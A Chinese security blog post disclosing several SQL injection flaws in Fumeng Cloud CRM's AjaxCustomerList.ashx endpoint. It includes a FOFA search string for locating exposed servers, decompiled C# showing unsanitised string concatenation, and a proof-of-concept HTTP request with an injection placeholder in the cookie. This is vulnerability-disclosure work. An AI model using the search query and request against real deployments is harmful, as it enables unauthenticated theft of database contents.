---
title: "孚盟云CRM AjaxCustomerList.ashx 多个SQL注入漏洞"
source: https://mrxn.net/jswz/fumacrm-Dingding-Ajax-AjaxCustomerList-sqli.html
asset_dir: assets/孚盟云crm-ajaxcustomerlist.ashx-多个sql注入漏洞
---

# 孚盟云CRM AjaxCustomerList.ashx 多个SQL注入漏洞

[Mrxn](https://mrxn.net/author/1)- 发表于2026/1/16 08:31
- 259浏览
- [0评论](#comment)
- 13分钟阅读

深入探索

传输层安全性协议

物流软件安全

SQL注入防护

---

# 漏洞简介

上海孚盟[软件](#)有限公司是一家专业的外贸SaaS服务和行业解决方案提供商。其旗下产品孚盟云AjaxCustomerList.ashx接口存在多个[SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)漏洞，未经身份验证的远程攻击者除了可以利用[SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)漏洞获取数据库中的信息(例如，管理员后台密码、站点的用户个人信息)之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。

SQL注入防护

# 影响版本

# fofa语法

> app="孚盟软件-孚盟云"

# 漏洞分析

直接看 `AjaxCustomerList.ashx` 对应的dll文件 `FumaCRM_BS.NewWeb.dll` 里有关 **AjaxCustomerList** 方法的实现如下

[![孚盟云CRM AjaxCustomerList.ashx 多个SQL注入漏洞](images/img-001-c4987d3f81f5.webp)](https://image.mrxn.net/e1f1f36bb9f442c19065f6d3104c8e19.webp)

当**method**=**showFocused**时，看下`showFocused`方法的实现

代码安全审计

深入探索

编码转换工具

Nessus

文件大小转换

```
  private void showFocused(HttpContext context, string empID)
  {
    DataTable mouldFieldList = new CreatePageManager().GetMouldFieldList("BF001", empID);
    DataTable structPanel = new CreatePageManager().GetStructPanel("BF001", empID, 1);
    DataTable mouldTableLinks = new CreatePageManager().GetMouldTableLinks("BF001");
    string sql = $"M.FID in (select custFID from tmFocusedCustomer where EmpID='{empID}') AND 1=1  AND  1=1";
    DataTable Sourcedd = new DataTable();
```

参数**empID**未经过任何过滤或校验就被直接拼接进SQL语句中进行执行，从而造成[SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)漏洞。

当**method=GetEmpCanViewRightType**时，一样的存在SQL注入漏洞

[![孚盟云CRM AjaxCustomerList.ashx 多个SQL注入漏洞](images/img-002-a4e434593671.webp)](https://image.mrxn.net/c2e3bc4c0d2742f89a45b1886ec19bf0.webp)

method=GetCustomerInfoByFid

漏洞扫描服务

[![孚盟云CRM AjaxCustomerList.ashx 多个SQL注入漏洞](images/img-003-7ec1e26bfa7e.webp)](https://image.mrxn.net/a23c150f3fcd4129b00d12ba0a08aaa2.webp)

method=lerevnClick

[![孚盟云CRM AjaxCustomerList.ashx 多个SQL注入漏洞](images/img-004-9bae2ff7c1e8.webp)](https://image.mrxn.net/5a8eec86987b46319e078fd8d73f8596.webp)

method=VersionCheck

[![孚盟云CRM AjaxCustomerList.ashx 多个SQL注入漏洞](images/img-005-9a3c7010634e.webp)](https://image.mrxn.net/36948f9202da4ce1b5a711425d003d30.webp)

method=EditCustomer

物流软件安全

[![孚盟云CRM AjaxCustomerList.ashx 多个SQL注入漏洞](images/img-006-d73aa49cdb2c.webp)](https://image.mrxn.net/173b03113d264573b0e18ba705edf237.webp)

method=SaveCust

[![孚盟云CRM AjaxCustomerList.ashx 多个SQL注入漏洞](images/img-007-a228292cf959.webp)](https://image.mrxn.net/fd0c3cc2abf4405fb3437600d379f04d.webp)

method=lingshi

[![孚盟云CRM AjaxCustomerList.ashx 多个SQL注入漏洞](images/img-008-d48ce8f8c279.webp)](https://image.mrxn.net/97f7db055b844b92b02796632e9fc821.webp)

method=updateversion

网络安全

[![孚盟云CRM AjaxCustomerList.ashx 多个SQL注入漏洞](images/img-009-cc084819921e.webp)](https://image.mrxn.net/b62d692933184bf6abd561445bfb2db1.webp)

method=AddContact

[![孚盟云CRM AjaxCustomerList.ashx 多个SQL注入漏洞](images/img-010-a88121ec9ad2.webp)](https://image.mrxn.net/10fa2892abc54ba5826246fb19969d1e.webp)

太多了 不一一列举了...

编程

# 漏洞复现

```
POST /m/Dingding/Ajax/AjaxCustomerList.ashx HTTP/1.1
Host: fumacrm.mrxn.net
Cookie: UserCookie={"empId":"')SQLI_POC--"}
Content-Type: application/x-www-form-urlencoded

method=showFocused
```

[![孚盟云CRM AjaxCustomerList.ashx 多个SQL注入漏洞](images/img-011-5d64d6a2aae5.webp)](https://image.mrxn.net/68df298e0ea54cd58a3b8398a177fc6b.webp)

通过报错注入在响应里回显数据库版本信息

SQL注入防护

- 标签：
- [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
- [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
- [#SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)
- [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
- [#0day](https://mrxn.net/tag/0day)
- [#asp.net](https://mrxn.net/tag/asp.net)

---

文章目录

- [1.漏洞简介](#toc-1-)
- [2.影响版本](#toc-2-)
- [3.fofa语法](#toc-3-)
- [4.漏洞分析](#toc-4-)
- [5.漏洞复现](#toc-5-)

  
  

![](data:image/png;base64,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)

手机扫码阅读

漏洞扫描服务
